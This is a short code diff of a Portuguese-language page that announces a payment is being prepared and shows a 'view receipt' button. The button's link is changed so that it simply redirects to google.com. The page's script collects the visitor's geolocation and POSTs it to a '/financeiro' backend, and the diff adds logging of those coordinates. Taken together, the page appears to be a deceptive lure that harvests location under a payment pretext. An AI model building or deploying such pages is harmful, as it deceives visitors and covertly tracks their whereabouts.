@@ -10,9 +10,7 @@
         <div class="jumbotron jumbotron-fluid">
             <h1 class="display-4" >Estamos preparando seu pagamento!</h1>
             <br>
-            <small class="form-text text-muted">Clique em <a class="btn btn-success" href="www.google.com"> Ver comprovante </a> para ver seu comprovante.</small>
-        </div>
-
+            <small class="form-text text-muted">Clique em <a onclick="window.location.href='https://www.google.com'" class="btn btn-success"> Ver comprovante </a> para ver seu comprovante.</small>
     </div>
 
     <script>
@@ -22,7 +20,8 @@
         navigator.geolocation.getCurrentPosition(async function(position) {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
-        
+            console.log('Enviando localização ao servidor:', latitude, longitude);
+            
             // Envia para o backend via fetch
             await fetch('/financeiro', {
                 method: 'POST',
